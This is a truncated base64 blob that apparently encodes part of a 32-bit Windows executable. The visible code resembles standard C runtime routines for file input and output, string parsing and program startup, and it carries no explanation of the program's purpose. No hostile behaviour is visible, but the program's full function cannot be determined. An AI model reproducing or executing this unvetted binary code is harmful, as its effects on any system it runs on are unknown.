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iTDoS+L//1ZWVlZWxwAWAAAA6NPh//+DxBTpQwYAAPZABCB0EWoCagBqAP91COgXIAAAg8QQ/3UI6PMhAABZhcAPhJ0CAACLBvZEBwSAD4SQAgAA6E0cAACLQGwzyTlIFI2FHOX//w+UwVCLBv80B4mNIOX///8VeOBAAIXAD4RgAgAAM8k5jSDl//90CITbD4RQAgAA/xV04EAAi5005f//iYUc5f//M8CJhTzl//85RRAPhkIFAACJhUTl//+KhSfl//+EwA+FZwEAAIoLi7Uo5f//M8CA+QoPlMCJhSDl//+LBgPHg3g4AHQVilA0iFX0iE31g2A4AGoCjUX0UOtLD77BUOguMAAAWYXAdDqLjTTl//8rywNNEDPAQDvID4alAQAAagKNhUDl//9TUOiyLwAAg8QMg/j/D4SxBAAAQ/+FROX//+sbagFTjYVA5f//UOiOLwAAg8QMg/j/D4SNBAAAM8BQUGoFjU30UWoBjY1A5f//UVD/tRzl//9D/4VE5f///xVw4EAAi/CF9g+EXAQAAGoAjYU85f//UFaNRfRQi4Uo5f//iwD/NAf/FWzgQACFwA+EKQQAAIuFROX//4uNMOX//wPBObU85f//iYU45f//D4wVBAAAg70g5f//AA+EzQAAAGoAjYU85f//UGoBjUX0UIuFKOX//4sAxkX0Df80B/8VbOBAAIXAD4TQAwAAg7085f//AQ+MzwMAAP+FMOX///+FOOX//+mDAAAAPAF0BDwCdSEPtzMzyWaD/goPlMFDQ4OFROX//wKJtUDl//+JjSDl//88AXQEPAJ1Uv+1QOX//+gRUwAAWWY7hUDl//8PhWgDAACDhTjl//8Cg70g5f//AHQpag1YUImFQOX//+jkUgAAWWY7hUDl//8PhTsDAAD/hTjl////hTDl//+LRRA5hUTl//8Pgvn9///pJwMAAIsOihP/hTjl//+IVA80iw6JRA846Q4DAAAzyYsGA8f2QASAD4S/AgAAi4U05f//iY1A5f//hNsPhcoAAACJhTzl//85TRAPhiADAADrBou1KOX//4uNPOX//4OlROX//wArjTTl//+NhUjl//87TRBzOYuVPOX///+FPOX//4oSQYD6CnUQ/4Uw5f//xgANQP+FROX//4gQQP+FROX//4G9ROX///8TAABywovYjYVI5f//K9hqAI2FLOX//1BTjYVI5f//UIsG/zQH/xVs4EAAhcAPhEICAACLhSzl//8BhTjl//87ww+MOgIAAIuFPOX//yuFNOX//ztFEA+CTP///+kgAgAAiYVE5f//gPsCD4XRAAAAOU0QD4ZNAgAA6waLtSjl//+LjUTl//+DpTzl//8AK4005f//jYVI5f//O00Qc0aLlUTl//+DhUTl//8CD7cSQUFmg/oKdRaDhTDl//8Cag1bZokYQECDhTzl//8Cg4U85f//AmaJEEBAgb085f///hMAAHK1i9iNhUjl//8r2GoAjYUs5f//UFONhUjl//9Qiwb/NAf/FWzgQACFwA+EYgEAAIuFLOX//wGFOOX//zvDD4xaAQAAi4VE5f//K4U05f//O0UQD4I/////6UABAAA5TRAPhnwBAACLjU